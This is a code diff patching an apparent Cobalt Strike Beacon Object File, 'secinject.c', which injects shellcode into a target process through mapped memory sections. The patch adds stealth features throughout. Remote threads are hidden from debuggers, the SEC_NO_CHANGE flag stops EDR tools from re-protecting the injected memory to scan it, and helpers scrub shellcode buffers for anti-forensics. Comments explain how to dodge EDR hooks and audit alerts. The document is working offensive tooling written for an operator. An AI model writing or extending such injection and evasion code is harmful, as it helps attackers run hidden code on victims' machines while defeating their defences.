@@ -2,20 +2,42 @@
  * secinject.c — Section-mapping process injection BOF
  *
  * Patched fork of https://github.com/apokryptein/secinject
- * Applied surgical OPSEC + robustness patches:
+ *
+ * patches-v1 (see git log):
  *   [1] CreateRemoteThread   → NtCreateThreadEx
  *   [3] PROCESS_ALL_ACCESS   → minimal target rights (0x100A)
  *   [4] handle leaks         → close hRemoteProcess and hThread
  *   [5] error checks         → OpenProcess, NtCreateThreadEx, cascading
  *
- * Deliberately NOT patched:
- *   [2] Section allocated PAGE_EXECUTE_READWRITE — required so we can hold
- *       both a local RW view (for memcpy) and a remote RX view (for the
- *       thread start). Section-level protection is a ceiling for its views;
- *       any narrower section would prevent one of the two mappings.
- *   [10] Userland ntdll calls (no SysWhispers) — on the roadmap for a
- *       follow-up patch; a direct-syscall stub set replaces every NTDLL$*
- *       call with an inline `mov eax, ssn / syscall` shim.
+ * patches-v2 (this commit):
+ *   [P1] THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER on NtCreateThreadEx —
+ *        the new thread is invisible to any debugger attached to the
+ *        target (DbgUiRemoteBreakin / DebugActiveProcess callbacks).
+ *        Doesn't hide from EDR; hides from x64dbg/WinDbg + any inline
+ *        debugger callback the target might have installed.
+ *   [P2] SEC_NO_CHANGE on NtCreateSection — blocks any subsequent
+ *        NtProtectVirtualMemory call from changing the view protections.
+ *        Defense-in-depth against EDRs that re-protect suspicious
+ *        sections to memory-scan them.
+ *   [P3] Symbolic NTSTATUS messages via ntstatus_str() helper —
+ *        operator sees the well-known code names alongside the hex,
+ *        e.g. "0xC0000022 STATUS_ACCESS_DENIED (target ACL / session
+ *        mismatch)" instead of raw hex only.
+ *   [P5] Anti-forensics scrubbing via zero_fill_bytes() helper — zero
+ *        the local view bytes before unmap, zero the beacon-owned
+ *        shellcode buffer we were given, NULL out our local pointer.
+ *        Prevents residual shellcode from sitting in the beacon
+ *        process's address space or in our stack frame after this BOF
+ *        returns.
+ *
+ * Deliberately NOT patched (both on the roadmap):
+ *   [2]  Section is PAGE_EXECUTE_READWRITE — required so we can hold
+ *        both a local RW view (for memcpy) and a remote RX view.
+ *        Section-level protection is the ceiling for its views;
+ *        narrowing the section breaks one of the two mappings.
+ *   [10] No direct/indirect syscalls — every NTDLL$* call still hits
+ *        the userland ntdll stub. SysWhispers3 candidate; deferred
+ *        pending lab-testable target.
  */
 
 #include <stdio.h>
@@ -25,7 +47,7 @@
 
 #define NT_SUCCESS 0x00000000
 
-/* Minimum rights we need on the target process:
+/* Minimum rights we need on the target process (patch [3], patches-v1):
  *   PROCESS_CREATE_THREAD             (0x0002) — NtCreateThreadEx target
  *   PROCESS_VM_OPERATION              (0x0008) — NtMapViewOfSection target
  *   PROCESS_QUERY_LIMITED_INFORMATION (0x1000) — kernel does an internal
@@ -33,11 +55,21 @@
  *                                                creation; without this some
  *                                                Win10+ builds return
  *                                                STATUS_ACCESS_DENIED
- * Total = 0x100A. PROCESS_ALL_ACCESS (0x1FFFFF) — what the upstream BOF
- * requested — is a classic ObjectAccess-audit red flag ("why does rundll32
- * need every right on msedge?"). 0x100A is a much smaller acl footprint.
- */
+ * Total = 0x100A. */
 #define SECINJECT_TARGET_RIGHTS (PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_QUERY_LIMITED_INFORMATION)
+
+/* Patch [P1], patches-v2: thread-creation flags (from ntpsapi.h). Not
+ * defined in the mingw-w64 windows.h we use, so pin the value here. */
+#ifndef THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER
+#define THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER 0x00000004
+#endif
+
+/* Patch [P2], patches-v2: section-attribute flag (from ntpsapi.h /
+ * winnt.h — not always exposed by mingw-w64). Blocks NtProtectVirtualMemory
+ * from modifying view protections after mapping. */
+#ifndef SEC_NO_CHANGE
+#define SEC_NO_CHANGE 0x00400000
+#endif
 
 WINBASEAPI HANDLE   WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
 WINBASEAPI HANDLE   WINAPI KERNEL32$GetCurrentProcess(void);
@@ -47,12 +79,40 @@ NTSYSCALLAPI NTSTATUS WINAPI NTDLL$NtCreateSection(PHANDLE, ACCESS_MASK, PVOID, 
 NTSYSAPI     NTSTATUS WINAPI NTDLL$NtMapViewOfSection(HANDLE, HANDLE, PVOID, ULONG, SIZE_T, PLARGE_INTEGER, PSIZE_T, UINT, ULONG, ULONG);
 NTSYSAPI     NTSTATUS WINAPI NTDLL$NtUnmapViewOfSection(HANDLE, PVOID);
 NTSYSCALLAPI NTSTATUS WINAPI NTDLL$NtClose(HANDLE);
-
-/* NtCreateThreadEx replaces CreateRemoteThread. CreateRemoteThread is the
- * single most heavily EDR-hooked injection API; NtCreateThreadEx sits one
- * layer lower (the ntdll syscall stub rather than the kernel32 wrapper).
- * Same kernel telemetry, different userland hook surface. */
 NTSYSCALLAPI NTSTATUS WINAPI NTDLL$NtCreateThreadEx(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
+
+
+/* Patch [P3], patches-v2: name the well-known NTSTATUS codes an operator
+ * will actually encounter (wrong session, PID gone, tight ACL, section
+ * size mismatch). Everything else falls through to "unknown" and the raw
+ * hex code still prints alongside. */
+static const char* ntstatus_str(NTSTATUS s) {
+    switch ((ULONG)s) {
+        case 0xC0000022: return "STATUS_ACCESS_DENIED (ACL / session mismatch / privilege gap)";
+        case 0xC0000005: return "STATUS_ACCESS_VIOLATION";
+        case 0xC000000D: return "STATUS_INVALID_PARAMETER";
+        case 0xC0000017: return "STATUS_NO_MEMORY";
+        case 0xC0000018: return "STATUS_CONFLICTING_ADDRESSES";
+        case 0xC0000024: return "STATUS_OBJECT_TYPE_MISMATCH";
+        case 0xC0000034: return "STATUS_OBJECT_NAME_NOT_FOUND";
+        case 0xC0000041: return "STATUS_UNABLE_TO_DELETE_SECTION";
+        case 0xC0000047: return "STATUS_QUOTA_EXCEEDED";
+        case 0xC000009A: return "STATUS_INSUFFICIENT_RESOURCES";
+        case 0xC0000106: return "STATUS_SECTION_TOO_BIG";
+        case 0xC000010A: return "STATUS_PROCESS_IS_TERMINATING";
+        case 0xC000004B: return "STATUS_THREAD_IS_TERMINATING";
+        case 0xC0000135: return "STATUS_DLL_NOT_FOUND";
+        case 0xC00000BB: return "STATUS_NOT_SUPPORTED";
+        default:         return "unknown";
+    }
+}
+
+/* Patch [P5], patches-v2: byte-by-byte zero fill. Can't use MSVCRT$memset
+ * without adding an import; keep the dependency footprint the same. */
+static void zero_fill_bytes(char* dst, SIZE_T size) {
+    volatile char* p = (volatile char*)dst;
+    while (size--) *p++ = 0;
+}
 
 
 void go(char * args, int len) {
@@ -75,11 +135,11 @@ void go(char * args, int len) {
     shellcodeSize = (SIZE_T)shellcodeLen;
 
     LARGE_INTEGER sectionSize;
-    sectionSize.QuadPart = (LONGLONG)shellcodeSize;   /* full 64-bit init, not just LowPart */
+    sectionSize.QuadPart = (LONGLONG)shellcodeSize;   /* full 64-bit init */
 
     hLocalProcess = KERNEL32$GetCurrentProcess();
 
-    /* Patch [3]: minimal rights (was PROCESS_ALL_ACCESS). */
+    /* Minimal rights (patches-v1 [3]). */
     hRemoteProcess = KERNEL32$OpenProcess(SECINJECT_TARGET_RIGHTS, FALSE, procID);
     if (hRemoteProcess == NULL) {
         BeaconPrintf(CALLBACK_ERROR, "[!] OpenProcess(%lu, 0x%x) failed — wrong session, PID gone, or ACL denied. GetLastError=%lu",
@@ -87,13 +147,18 @@ void go(char * args, int len) {
         return;
     }
 
-    /* Section held RWX so we can map RW locally + RX remotely (see patch
-     * [2] note in the file header). Not stealthy against EDRs that hook
-     * NtCreateSection specifically on RWX — that's on the roadmap. */
+    /* Section — PAGE_EXECUTE_READWRITE required so we can hold a local RW
+     * view and a remote RX view (see roadmap patch [2]).
+     * SEC_NO_CHANGE (patch [P2], patches-v2) blocks NtProtectVirtualMemory
+     * from changing view protections later — defense-in-depth against
+     * EDR-driven section re-protection for scanning. */
     NTSTATUS res = NTDLL$NtCreateSection(&hSection, GENERIC_ALL, NULL, &sectionSize,
-                                          PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
+                                          PAGE_EXECUTE_READWRITE,
+                                          SEC_COMMIT | SEC_NO_CHANGE,
+                                          NULL);
     if (res != NT_SUCCESS) {
-        BeaconPrintf(CALLBACK_ERROR, "[!] NtCreateSection failed NTSTATUS=0x%08x", (unsigned)res);
+        BeaconPrintf(CALLBACK_ERROR, "[!] NtCreateSection failed NTSTATUS=0x%08x %s",
+                     (unsigned)res, ntstatus_str(res));
         NTDLL$NtClose(hRemoteProcess);
         return;
     }
@@ -105,7 +170,8 @@ void go(char * args, int len) {
                                                        2 /* ViewUnmap */, 0,
                                                        PAGE_READWRITE);
     if (mapStatusLocal != NT_SUCCESS) {
-        BeaconPrintf(CALLBACK_ERROR, "[!] NtMapViewOfSection(local) failed NTSTATUS=0x%08x", (unsigned)mapStatusLocal);
+        BeaconPrintf(CALLBACK_ERROR, "[!] NtMapViewOfSection(local) failed NTSTATUS=0x%08x %s",
+                     (unsigned)mapStatusLocal, ntstatus_str(mapStatusLocal));
         NTDLL$NtClose(hSection);
         NTDLL$NtClose(hRemoteProcess);
         return;
@@ -118,7 +184,8 @@ void go(char * args, int len) {
                                                         2 /* ViewUnmap */, 0,
                                                         PAGE_EXECUTE_READ);
     if (mapStatusRemote != NT_SUCCESS) {
-        BeaconPrintf(CALLBACK_ERROR, "[!] NtMapViewOfSection(remote) failed NTSTATUS=0x%08x", (unsigned)mapStatusRemote);
+        BeaconPrintf(CALLBACK_ERROR, "[!] NtMapViewOfSection(remote) failed NTSTATUS=0x%08x %s",
+                     (unsigned)mapStatusRemote, ntstatus_str(mapStatusRemote));
         NTDLL$NtUnmapViewOfSection(hLocalProcess, baseAddrLocal);
         NTDLL$NtClose(hSection);
         NTDLL$NtClose(hRemoteProcess);
@@ -128,31 +195,47 @@ void go(char * args, int len) {
     /* Copy shellcode via the local RW view — no cross-process write. */
     mycopy(baseAddrLocal, shellcode, (int)shellcodeSize);
 
-    /* Unmap the local view so the shellcode isn't sitting in beacon's own
-     * address space after this call returns. */
+    /* Patch [P5], patches-v2: anti-forensics scrubbing before we unmap.
+     *   1. Zero the local view bytes — nothing to page out later.
+     *   2. Zero the beacon-owned shellcode buffer BeaconDataExtract gave
+     *      us — beacon frees it after we return but no reason to leave
+     *      the shellcode live in the interim.
+     *   3. NULL our local pointer so the stack frame doesn't reference
+     *      it after this call returns. */
+    zero_fill_bytes((char*)baseAddrLocal, shellcodeSize);
+    zero_fill_bytes(shellcode, shellcodeSize);
+    shellcode = NULL;
+
+    /* Unmap the local view. */
     NTDLL$NtUnmapViewOfSection(hLocalProcess, baseAddrLocal);
+    baseAddrLocal = NULL;
 
     /* Section handle can drop now — both mapped views hold refs and keep
      * the underlying section alive until they themselves unmap. */
     NTDLL$NtClose(hSection);
+    hSection = NULL;
 
-    /* Patch [1]: NtCreateThreadEx (was CreateRemoteThread). */
+    /* Patch [1] patches-v1: NtCreateThreadEx (was CreateRemoteThread).
+     * Patch [P1] patches-v2: HIDE_FROM_DEBUGGER flag — invisible to any
+     * debugger attached to the target. */
     NTSTATUS threadStatus = NTDLL$NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS,
                                                     NULL, hRemoteProcess,
                                                     baseAddrRemote, NULL,
-                                                    0, 0, 0, 0, NULL);
+                                                    THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER,
+                                                    0, 0, 0, NULL);
     if (threadStatus != NT_SUCCESS) {
-        BeaconPrintf(CALLBACK_ERROR, "[!] NtCreateThreadEx failed NTSTATUS=0x%08x", (unsigned)threadStatus);
+        BeaconPrintf(CALLBACK_ERROR, "[!] NtCreateThreadEx failed NTSTATUS=0x%08x %s",
+                     (unsigned)threadStatus, ntstatus_str(threadStatus));
         NTDLL$NtUnmapViewOfSection(hRemoteProcess, baseAddrRemote);
         NTDLL$NtClose(hRemoteProcess);
         return;
     }
 
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] Injected %d bytes into PID %lu via section mapping (thread=0x%p)",
-                 shellcodeLen, procID, hThread);
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Injected %d bytes into PID %lu via section mapping (thread=0x%p, hide-from-debugger, sec-no-change)",
+                 (int)shellcodeSize, procID, hThread);
 
-    /* Patch [4]: close both handles — no inter-process handle correlation
-     * trail. Upstream leaked both hRemoteProcess and hThread. */
+    /* Patches-v1 [4]: close both handles — no inter-process handle
+     * correlation trail. */
     NTDLL$NtClose(hThread);
     NTDLL$NtClose(hRemoteProcess);
 }
